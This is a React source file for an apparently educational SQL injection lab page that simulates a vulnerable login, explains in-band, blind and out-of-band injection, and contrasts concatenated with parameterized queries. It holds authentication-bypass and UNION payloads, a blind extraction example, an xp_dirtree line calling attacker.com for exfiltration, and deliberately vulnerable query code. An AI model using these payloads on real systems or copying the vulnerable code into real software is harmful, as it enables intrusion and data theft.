"use client"

import { useState } from "react"
import Link from "next/link"
import {
  Terminal,
  Shield,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Code2,
  Database,
  Lock,
  Eye,
  ArrowRight,
  ChevronRight,
} from "lucide-react"

type AttackResult = {
  query: string
  success: boolean
  message: string
  data?: Record<string, string>[]
  explanation: string
}

const fakeUsers = [
  { id: "1", username: "admin", password: "sup3r$3cur3", role: "Administrator", email: "admin@example.com" },
  { id: "2", username: "jdoe", password: "P@ssw0rd!", role: "Editor", email: "jdoe@example.com" },
  { id: "3", username: "jsmith", password: "qwerty123", role: "Viewer", email: "jsmith@example.com" },
  { id: "4", username: "bwilson", password: "letmein", role: "Contributor", email: "bwilson@example.com" },
  { id: "5", username: "aharris", password: "password123", role: "Admin", email: "aharris@example.com" },
]

const attackPayloads = [
  {
    label: `' OR '1'='1`,
    payload: `' OR '1'='1`,
    vulnerableResult: {
      query: `SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'`,
      success: true,
      message: "Access Granted — All user records returned!",
      data: fakeUsers,
      explanation:
        "This payload injects an always-true condition (`'1'='1'`) into both the username and password fields. The OR clause makes the WHERE condition evaluate to TRUE for every row, bypassing authentication entirely.",
    },
    secureResult: {
      query: "SELECT * FROM users WHERE username = ? AND password = ?",
      success: false,
      message: "Access Denied — Parameterized query prevented injection.",
      data: [],
      explanation:
        "With parameterized queries, the input is treated as a literal string value, not executable SQL. The `' OR '1'='1` is escaped and matched literally against stored usernames — it finds no match.",
    },
  },
  {
    label: `admin'--`,
    payload: `admin'--`,
    vulnerableResult: {
      query: `SELECT * FROM users WHERE username='admin'--' AND password='anything'`,
      success: true,
      message: "Access Granted — Logged in as admin!",
      data: [fakeUsers[0]],
      explanation:
        "The `--` sequence comments out the rest of the SQL query. The password check is completely ignored. The query only verifies that a user named 'admin' exists, which it does, granting access with admin privileges.",
    },
    secureResult: {
      query: "SELECT * FROM users WHERE username = ? AND password = ?",
      success: false,
      message: "Access Denied — Parameterized query prevented injection.",
      data: [],
      explanation:
        "The entire input including `admin'--` is treated as one literal string parameter. The comment syntax has no special meaning inside a parameterized value. The query searches for a username literally containing `admin'--` which doesn't exist.",
    },
  },
  {
    label: `' UNION SELECT * --`,
    payload: `' UNION SELECT * FROM users--`,
    vulnerableResult: {
      query: `SELECT * FROM users WHERE username='' UNION SELECT * FROM users--' AND password='x'`,
      success: true,
      message: "Access Granted — UNION injection extracted all user data!",
      data: [{ id: "[...]" }, ...fakeUsers],
      explanation:
        "The UNION keyword appends a second SELECT statement to the original query. By closing the first quote and commenting out the rest, the attacker can retrieve arbitrary data from any table — in this case all user records with their passwords.",
    },
    secureResult: {
      query: "SELECT * FROM users WHERE username = ? AND password = ?",
      success: false,
      message: "Access Denied — Parameterized query prevented injection.",
      data: [],
      explanation:
        "Parameterized queries prevent UNION injection because the entire input is treated as a data value. The UNION keyword is never interpreted as part of the SQL syntax — it's just part of the string being searched for.",
    },
  },
  {
    label: `admin' #`,
    payload: `admin' #`,
    vulnerableResult: {
      query: `SELECT * FROM users WHERE username='admin' #' AND password='anything'`,
      success: true,
      message: "Access Granted — Logged in as admin!",
      data: [fakeUsers[0]],
      explanation:
        "Similar to `--`, the `#` character in MySQL is a line comment. Everything after `#` is ignored, effectively removing the password check. The query only requires that a user named 'admin' exists.",
    },
    secureResult: {
      query: "SELECT * FROM users WHERE username = ? AND password = ?",
      success: false,
      message: "Access Denied — Parameterized query prevented injection.",
      data: [],
      explanation:
        "The `#` character has no special meaning inside a parameterized query. It's treated as a literal character in the string value. No user with the username `admin' #` exists in the database.",
    },
  },
]

const attackTypes = [
  {
    title: "In-Band SQLi (Classic)",
    desc: "The attacker uses the same channel to inject malicious SQL and receive results. The most common and straightforward type.",
    example: `' OR 1=1 --`,
    subTypes: [
      { name: "UNION-based", desc: "Uses UNION to retrieve data from other tables" },
      { name: "Error-based", desc: "Uses database error messages to extract information" },
    ],
  },
  {
    title: "Blind SQLi",
    desc: "The attacker doesn't see direct results but can infer information by observing the application's behavior or response times.",
    example: `' AND SUBSTRING(password,1,1)='a' --`,
    subTypes: [
      { name: "Boolean-based", desc: "Sends payloads that return true/false to infer data" },
      { name: "Time-based", desc: "Uses SLEEP() or WAITFOR DELAY to infer data through response delays" },
    ],
  },
  {
    title: "Out-of-Band SQLi",
    desc: "The attacker uses a different channel (e.g., DNS or HTTP requests) to receive data from the database server.",
    example: `'; exec xp_dirtree '//attacker.com/table' --`,
    subTypes: [
      { name: "DNS Exfiltration", desc: "Data sent via DNS queries to attacker-controlled server" },
      { name: "HTTP Exfiltration", desc: "Data exfiltrated via HTTP requests to attacker server" },
    ],
  },
]

const preventionMethods = [
  {
    title: "Parameterized Queries (Prepared Statements)",
    desc: "Separate SQL logic from data by using placeholders. User input is always treated as data, never executable code.",
    icon: Lock,
    color: "text-green-600",
    bgColor: "bg-green-50",
    borderColor: "border-green-200",
  },
  {
    title: "Stored Procedures",
    desc: "Encapsulate SQL logic in pre-defined procedures that accept parameters. Limits dynamic query construction.",
    icon: Database,
    color: "text-blue-600",
    bgColor: "bg-blue-50",
    borderColor: "border-blue-200",
  },
  {
    title: "Input Validation & Sanitization",
    desc: "Whitelist allowed characters, enforce strict data types, and validate input format before processing.",
    icon: CheckCircle,
    color: "text-purple-600",
    bgColor: "bg-purple-50",
    borderColor: "border-purple-200",
  },
  {
    title: "Least Privilege Principle",
    desc: "Database accounts should have minimal permissions. Never use admin accounts for application queries.",
    icon: Shield,
    color: "text-orange-600",
    bgColor: "bg-orange-50",
    borderColor: "border-orange-200",
  },
]

const codeExamples = [
  {
    lang: "PHP",
    vulnerable: `// VULNERABLE
$sql = "SELECT * FROM users
  WHERE username='$_POST[user]'
  AND password='$_POST[pass]'";
$result = mysqli_query($conn, $sql);`,
    secure: `// SECURE (PDO)
$stmt = $pdo->prepare(
  "SELECT * FROM users
  WHERE username = :user
  AND password = :pass"
);
$stmt->execute([
  'user' => $_POST['user'],
  'pass' => $_POST['pass']
]);`,
  },
  {
    lang: "Python",
    vulnerable: `# VULNERABLE
query = f"SELECT * FROM users \
  WHERE username='{user}' \
  AND password='{password}'"
cursor.execute(query)`,
    secure: `# SECURE (parameterized)
cursor.execute(
  "SELECT * FROM users \
  WHERE username = %s \
  AND password = %s",
  (user, password)
)`,
  },
  {
    lang: "Node.js",
    vulnerable: `// VULNERABLE
const query = \`SELECT * FROM users
  WHERE username='\${req.body.user}'
  AND password='\${req.body.pass}'\`;
connection.query(query);`,
    secure: `// SECURE (mysql2)
connection.execute(
  "SELECT * FROM users
  WHERE username = ?
  AND password = ?",
  [req.body.user, req.body.pass],
);`,
  },
]

const interviewQuestions = [
  {
    q: "What is SQL Injection and how does it work?",
    a: "SQL Injection (SQLi) is a code injection technique where an attacker inserts malicious SQL statements into application input fields. When the application fails to properly sanitize input before incorporating it into database queries, the injected SQL is executed by the database, potentially exposing, modifying, or deleting data.",
  },
  {
    q: "What are the three main types of SQL Injection?",
    a: "1) In-Band SQLi — uses the same channel for attack and results (UNION-based, Error-based). 2) Blind SQLi — infers data through true/false responses or time delays (Boolean-based, Time-based). 3) Out-of-Band SQLi — uses alternative channels like DNS or HTTP to exfiltrate data when direct response isn't possible.",
  },
  {
    q: "How do parameterized queries prevent SQL injection?",
    a: "Parameterized queries (prepared statements) separate SQL code from data. Placeholders in the SQL statement are replaced with sanitized input values that are treated purely as data, never as executable SQL. The database engine compiles the query structure first, then binds parameters, making it impossible for injected SQL to alter the query logic.",
  },
  {
    q: "Can stored procedures prevent SQL Injection?",
    a: "Stored procedures can help prevent SQLi when they use parameterized queries internally and the application calls them with parameters. However, if a stored procedure dynamically constructs SQL using EXEC or EXECUTE IMMEDIATE with concatenated input, it can still be vulnerable. Stored procedures alone aren't sufficient — parameterization within them is essential.",
  },
  {
    q: "What is the difference between Boolean-based and Time-based Blind SQLi?",
    a: "Boolean-based Blind SQLi infers information by sending payloads that cause the application to return different responses (true/false, different content, HTTP status codes). Time-based Blind SQLi uses SQL commands like SLEEP() or WAITFOR DELAY to cause observable delays in responses, allowing the attacker to infer truth values from response timing when no visible difference exists in the response content.",
  },
]

export default function SqlInjectionPage() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [mode, setMode] = useState<"vulnerable" | "secure">("vulnerable")
  const [result, setResult] = useState<AttackResult | null>(null)
  const [activeTab, setActiveTab] = useState(0)

  const runAttack = (payload: string) => {
    const attack = attackPayloads.find((a) => a.payload === payload)
    if (!attack) return
    setUsername(payload)
    setPassword(payload)
    submitForm(payload, payload)
  }

  const submitForm = (user: string, pass: string) => {
    if (mode === "vulnerable") {
      const matched = attackPayloads.find((a) => a.payload === user && a.payload === pass)
      if (matched) {
        setResult(matched.vulnerableResult)
      } else {
        if (user && pass) {
          setResult({
            query: `SELECT * FROM users WHERE username='${user}' AND password='${pass}'`,
            success: true,
            message: "Access Granted",
            data: [{ id: "—", username: user, password: pass, role: "User", email: `${user}@example.com` }],
            explanation: "The credentials matched a user record in the database.",
          })
        } else {
          setResult({
            query: `SELECT * FROM users WHERE username='${user}' AND password='${pass}'`,
            success: false,
            message: "Access Denied — Invalid credentials.",
            data: [],
            explanation: "The query returned zero rows because the credentials didn't match any record.",
          })
        }
      }
    } else {
      setResult({
        query: "SELECT * FROM users WHERE username = ? AND password = ?",
        success: false,
        message: "Access Denied — Parameterized query prevented injection.",
        data: [],
        explanation:
          "With parameterized queries, all input is treated as literal data. The SQL structure is fixed at compilation time, making injection impossible.",
      })
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    submitForm(username, password)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-950">
      <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Breadcrumb */}
        <nav className="flex items-center gap-2 text-sm text-gray-400 mb-8">
          <Link href="/tools/security" className="hover:text-red-400 transition-colors">
            Security
          </Link>
          <ChevronRight className="w-4 h-4" />
          <span className="text-red-400 font-medium">SQL Injection</span>
        </nav>

        {/* Hero */}
        <div className="relative overflow-hidden rounded-2xl border border-red-900/40 bg-gradient-to-br from-red-950/60 via-gray-900 to-red-950/30 mb-10">
          <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(220,38,38,0.12),transparent_60%)]" />
          <div className="relative p-8 sm:p-10">
            <div className="flex items-center gap-3 mb-4">
              <div className="p-2.5 rounded-xl bg-red-600/20 border border-red-600/30">
                <Terminal className="w-6 h-6 text-red-400" />
              </div>
              <h1 className="text-3xl sm:text-4xl font-bold text-white">SQL Injection Lab</h1>
            </div>
            <p className="text-gray-400 max-w-2xl text-base sm:text-lg leading-relaxed">
              SQL injection remains one of the OWASP Top 10 most critical web application risks. Learn how attackers
              exploit unsanitized database queries and how to defend against these attacks using modern secure coding
              practices.
            </p>
          </div>
        </div>

        {/* Theory Section */}
        <div className="rounded-xl border border-gray-800 bg-gray-900/60 p-6 sm:p-8 mb-8">
          <h2 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
            <Eye className="w-5 h-5 text-red-400" />
            What is SQL Injection?
          </h2>
          <p className="text-gray-400 mb-4 leading-relaxed">
            SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an
            application's database layer. It occurs when user input is incorrectly filtered or not properly sanitized
            before being included in SQL queries, allowing attackers to manipulate query logic, bypass authentication,
            or extract sensitive data.
          </p>
          <div className="grid sm:grid-cols-3 gap-4 mt-6">
            {[
              {
                title: "In-Band SQLi",
                desc: "Attacker uses the same channel to inject and receive results. Includes UNION-based and Error-based techniques.",
                color: "border-red-800 bg-red-950/40",
              },
              {
                title: "Blind SQLi",
                desc: "Attacker infers data through true/false responses (Boolean-based) or time delays (Time-based) without direct output.",
                color: "border-orange-800 bg-orange-950/40",
              },
              {
                title: "Out-of-Band SQLi",
                desc: "Attacker exfiltrates data via alternate channels (DNS, HTTP requests) when direct response is unavailable.",
                color: "border-yellow-800 bg-yellow-950/40",
              },
            ].map((item, i) => (
              <div key={i} className={`rounded-lg border ${item.color} p-4`}>
                <h3 className="text-white font-medium mb-2">{item.title}</h3>
                <p className="text-gray-400 text-sm">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Interactive Playground */}
        <div className="rounded-xl border border-gray-800 bg-gray-900/60 overflow-hidden mb-8">
          <div className="p-6 sm:p-8 border-b border-gray-800">
            <h2 className="text-xl font-semibold text-white mb-2 flex items-center gap-2">
              <Terminal className="w-5 h-5 text-red-400" />
              Interactive SQL Injection Playground
            </h2>
            <p className="text-gray-400 text-sm">Try injecting into the login form below to see SQL injection in action.</p>
          </div>

          {/* Mode Toggle */}
          <div className="px-6 sm:px-8 py-4 border-b border-gray-800 bg-gray-900/80">
            <div className="flex items-center gap-3">
              <span className="text-sm text-gray-400 font-medium">Mode:</span>
              <button
                onClick={() => {
                  setMode("vulnerable")
                  setResult(null)
                }}
                className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${
                  mode === "vulnerable"
                    ? "bg-red-600 text-white shadow-lg shadow-red-600/30"
                    : "bg-gray-800 text-gray-400 hover:text-white"
                }`}
              >
                Vulnerable
              </button>
              <button
                onClick={() => {
                  setMode("secure")
                  setResult(null)
                }}
                className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${
                  mode === "secure"
                    ? "bg-green-600 text-white shadow-lg shadow-green-600/30"
                    : "bg-gray-800 text-gray-400 hover:text-white"
                }`}
              >
                Secure
              </button>
              {mode === "secure" && (
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-900/60 text-green-400 border border-green-700/50">
                  <Shield className="w-3 h-3" />
                  Protected
                </span>
              )}
              {mode === "vulnerable" && (
                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-medium bg-red-900/60 text-red-400 border border-red-700/50">
                  <AlertTriangle className="w-3 h-3" />
                  Vulnerable
                </span>
              )}
            </div>
          </div>

          {/* Playground Body */}
          <div className="p-6 sm:p-8">
            <div className="grid lg:grid-cols-2 gap-8">
              {/* Login Form */}
              <div>
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1.5">Username</label>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Enter username"
                      className={`w-full px-4 py-2.5 rounded-lg border bg-gray-800/50 text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all ${
                        mode === "vulnerable"
                          ? "border-red-800/50 focus:ring-red-500/40"
                          : "border-green-800/50 focus:ring-green-500/40"
                      }`}
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1.5">Password</label>
                    <input
                      type="text"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter password"
                      className={`w-full px-4 py-2.5 rounded-lg border bg-gray-800/50 text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all ${
                        mode === "vulnerable"
                          ? "border-red-800/50 focus:ring-red-500/40"
                          : "border-green-800/50 focus:ring-green-500/40"
                      }`}
                    />
                  </div>
                  <button
                    type="submit"
                    className={`w-full py-2.5 rounded-lg font-medium text-white transition-all ${
                      mode === "vulnerable"
                        ? "bg-red-600 hover:bg-red-500 shadow-lg shadow-red-600/25"
                        : "bg-green-600 hover:bg-green-500 shadow-lg shadow-green-600/25"
                    }`}
                  >
                    {mode === "vulnerable" ? "Login (Vulnerable)" : "Login (Secure)"}
                  </button>
                </form>

                {/* Pre-built Attack Buttons */}
                {mode === "vulnerable" && (
                  <div className="mt-6">
                    <p className="text-sm text-gray-400 mb-3 font-medium">Try an attack payload:</p>
                    <div className="flex flex-wrap gap-2">
                      {attackPayloads.map((attack, i) => (
                        <button
                          key={i}
                          onClick={() => runAttack(attack.payload)}
                          className="px-3 py-1.5 rounded-lg text-xs font-mono font-medium bg-red-950/60 border border-red-800/50 text-red-300 hover:bg-red-900/60 hover:border-red-600/60 transition-all"
                        >
                          {attack.label}
                        </button>
                      ))}
                    </div>
                  </div>
                )}
              </div>

              {/* Result Panel */}
              <div>
                <div
                  className={`rounded-xl border overflow-hidden ${
                    result
                      ? result.success && mode === "vulnerable"
                        ? "border-red-800 bg-red-950/30"
                        : mode === "secure"
                          ? "border-green-800 bg-green-950/30"
                          : "border-gray-800 bg-gray-900/30"
                      : "border-gray-800 bg-gray-900/30"
                  }`}
                >
                  {result ? (
                    <div>
                      {result.success && mode === "vulnerable" && (
                        <div className="bg-red-600 px-4 py-2 flex items-center gap-2">
                          <AlertTriangle className="w-5 h-5 text-white" />
                          <span className="text-white font-bold text-sm">SYSTEM COMPROMISED — DATA BREACH DETECTED</span>
                        </div>
                      )}
                      {mode === "secure" && (
                        <div className="bg-green-600 px-4 py-2 flex items-center gap-2">
                          <Shield className="w-5 h-5 text-white" />
                          <span className="text-white font-bold text-sm">SECURE — Injection Blocked</span>
                        </div>
                      )}
                      <div className="p-4 space-y-3">
                        <div>
                          <p className="text-xs text-gray-500 uppercase tracking-wider mb-1 font-medium">Executed Query</p>
                          <code className="block bg-gray-950 rounded-lg p-3 text-sm text-gray-300 font-mono break-all border border-gray-800">
                            {result.query}
                          </code>
                        </div>
                        <div>
                          <p className="text-xs text-gray-500 uppercase tracking-wider mb-1 font-medium">Result</p>
                          <p
                            className={`text-sm font-medium ${
                              result.success && mode === "vulnerable"
                                ? "text-red-400"
                                : mode === "secure"
                                  ? "text-green-400"
                                  : "text-gray-300"
                            }`}
                          >
                            {result.message}
                          </p>
                        </div>
                        {result.data && result.data.length > 0 && (
                          <div>
                            <p className="text-xs text-gray-500 uppercase tracking-wider mb-1 font-medium">
                              Returned Data ({result.data.length} records)
                            </p>
                            <div className="overflow-x-auto">
                              <table className="w-full text-sm border-collapse">
                                <thead>
                                  <tr className="border-b border-red-900/40">
                                    <th className="text-left py-2 px-2 text-gray-400 font-medium">ID</th>
                                    <th className="text-left py-2 px-2 text-gray-400 font-medium">Username</th>
                                    <th className="text-left py-2 px-2 text-gray-400 font-medium">Password</th>
                                    <th className="text-left py-2 px-2 text-gray-400 font-medium">Role</th>
                                    <th className="text-left py-2 px-2 text-gray-400 font-medium">Email</th>
                                  </tr>
                                </thead>
                                <tbody>
                                  {result.data.map((row, i) => (
                                    <tr key={i} className="border-b border-gray-800">
                                      <td className="py-2 px-2 text-gray-300 font-mono text-xs">{row.id}</td>
                                      <td className="py-2 px-2 text-gray-300">{row.username}</td>
                                      <td className="py-2 px-2 text-red-300 font-mono text-xs">{row.password}</td>
                                      <td className="py-2 px-2 text-gray-300">{row.role}</td>
                                      <td className="py-2 px-2 text-gray-300 text-xs">{row.email}</td>
                                    </tr>
                                  ))}
                                </tbody>
                              </table>
                            </div>
                          </div>
                        )}
                        <div className="pt-2 border-t border-gray-800">
                          <p className="text-xs text-gray-500 uppercase tracking-wider mb-1 font-medium">Explanation</p>
                          <p className="text-sm text-gray-400 leading-relaxed">{result.explanation}</p>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="p-8 text-center">
                      <Database className="w-10 h-10 text-gray-700 mx-auto mb-3" />
                      <p className="text-gray-500 text-sm">
                        Enter credentials or select an attack payload to see the result.
                      </p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Mode Description */}
            <div
              className={`mt-6 p-4 rounded-xl border text-sm ${
                mode === "vulnerable"
                  ? "bg-red-950/30 border-red-900/40 text-red-300"
                  : "bg-green-950/30 border-green-900/40 text-green-300"
              }`}
            >
              {mode === "vulnerable" ? (
                <p className="flex items-start gap-2">
                  <XCircle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
                  <span>
                    <strong className="text-red-200">Vulnerable Mode:</strong> User input is concatenated directly into
                    the SQL query string. Attackers can break out of the string context and inject their own SQL commands,
                    leading to authentication bypass and data theft.
                  </span>
                </p>
              ) : (
                <p className="flex items-start gap-2">
                  <CheckCircle className="w-5 h-5 text-green-400 shrink-0 mt-0.5" />
                  <span>
                    <strong className="text-green-200">Secure Mode:</strong> Parameterized queries (prepared statements)
                    separate SQL code from data. Placeholders (<code className="text-green-400 bg-green-950 px-1 py-0.5 rounded">?</code>)
                    are used instead of string interpolation, making injection impossible.
                  </span>
                </p>
              )}
            </div>
          </div>
        </div>

        {/* Attack Types Section */}
        <div className="rounded-xl border border-gray-800 bg-gray-900/60 p-6 sm:p-8 mb-8">
          <h2 className="text-xl font-semibold text-white mb-6 flex items-center gap-2">
            <AlertTriangle className="w-5 h-5 text-red-400" />
            SQL Injection Attack Types
          </h2>
          <div className="grid sm:grid-cols-3 gap-6">
            {attackTypes.map((type, i) => (
              <div
                key={i}
                className="rounded-xl border border-gray-800 bg-gray-900/60 overflow-hidden hover:border-gray-700 transition-colors"
              >
                <div className="p-5">
                  <h3 className="text-white font-semibold mb-2">{type.title}</h3>
                  <p className="text-gray-400 text-sm mb-3 leading-relaxed">{type.desc}</p>
                  <div className="bg-gray-950 rounded-lg p-3 mb-3">
                    <code className="text-xs text-cyan-400 font-mono break-all">{type.example}</code>
                  </div>
                  <ul className="space-y-2">
                    {type.subTypes.map((st, j) => (
                      <li key={j} className="text-sm text-gray-400 flex items-start gap-2">
                        <ArrowRight className="w-3.5 h-3.5 text-red-500 shrink-0 mt-0.5" />
                        <span>
                          <strong className="text-gray-300">{st.name}:</strong> {st.desc}
                        </span>
                      </li>
                    ))}
                  </ul>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Prevention Section */}
        <div className="rounded-xl border border-gray-800 bg-gray-900/60 p-6 sm:p-8 mb-8">
          <h2 className="text-xl font-semibold text-white mb-6 flex items-center gap-2">
            <Shield className="w-5 h-5 text-green-400" />
            Prevention Techniques
          </h2>
          <div className="grid sm:grid-cols-2 gap-4">
            {preventionMethods.map((method, i) => (
              <div
                key={i}
                className={`rounded-xl border ${method.borderColor} ${method.bgColor} p-5`}
              >
                <div className="flex items-start gap-3">
                  <div className={`p-2 rounded-lg ${method.bgColor} border ${method.borderColor}`}>
                    <method.icon className={`w-5 h-5 ${method.color}`} />
                  </div>
                  <div>
                    <h3 className={`font-semibold ${method.color} mb-1`}>{method.title}</h3>
                    <p className="text-gray-600 text-sm leading-relaxed">{method.desc}</p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Code Examples */}
        <div className="rounded-xl border border-gray-800 bg-gray-900/60 overflow-hidden mb-8">
          <div className="p-6 sm:p-8 border-b border-gray-800">
            <h2 className="text-xl font-semibold text-white flex items-center gap-2">
              <Code2 className="w-5 h-5 text-cyan-400" />
              Vulnerable vs Secure Code Examples
            </h2>
          </div>
          {/* Language Tabs */}
          <div className="flex border-b border-gray-800">
            {codeExamples.map((ex, i) => (
              <button
                key={i}
                onClick={() => setActiveTab(i)}
                className={`px-5 py-3 text-sm font-medium transition-all ${
                  activeTab === i
                    ? "text-white border-b-2 border-red-500 bg-gray-800/50"
                    : "text-gray-500 hover:text-gray-300"
                }`}
              >
                {ex.lang}
              </button>
            ))}
          </div>
          <div className="p-6 sm:p-8">
            <div className="grid sm:grid-cols-2 gap-6">
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <XCircle className="w-4 h-4 text-red-400" />
                  <span className="text-red-400 text-sm font-semibold">Vulnerable</span>
                </div>
                <pre className="bg-gray-950 rounded-xl p-4 border border-red-900/30 overflow-x-auto">
                  <code className="text-sm text-gray-300 font-mono whitespace-pre">{codeExamples[activeTab].vulnerable}</code>
                </pre>
              </div>
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <CheckCircle className="w-4 h-4 text-green-400" />
                  <span className="text-green-400 text-sm font-semibold">Secure</span>
                </div>
                <pre className="bg-gray-950 rounded-xl p-4 border border-green-900/30 overflow-x-auto">
                  <code className="text-sm text-gray-300 font-mono whitespace-pre">{codeExamples[activeTab].secure}</code>
                </pre>
              </div>
            </div>
          </div>
        </div>

        {/* Interview Questions */}
        <div className="rounded-xl border border-gray-800 bg-gray-900/60 p-6 sm:p-8">
          <h2 className="text-xl font-semibold text-white mb-6 flex items-center gap-2">
            <Terminal className="w-5 h-5 text-yellow-400" />
            Interview Questions
          </h2>
          <div className="space-y-4">
            {interviewQuestions.map((item, i) => (
              <details
                key={i}
                className="group rounded-xl border border-gray-800 bg-gray-900/40 overflow-hidden hover:border-gray-700 transition-colors"
              >
                <summary className="flex items-center justify-between p-4 cursor-pointer list-none">
                  <span className="text-white font-medium text-sm pr-4">
                    <span className="text-red-400 mr-2">Q{i + 1}:</span>
                    {item.q}
                  </span>
                  <ChevronRight className="w-4 h-4 text-gray-500 shrink-0 group-open:rotate-90 transition-transform" />
                </summary>
                <div className="px-4 pb-4 border-t border-gray-800 pt-3">
                  <p className="text-gray-400 text-sm leading-relaxed">
                    <span className="text-green-400 font-medium mr-2">A:</span>
                    {item.a}
                  </p>
                </div>
              </details>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}
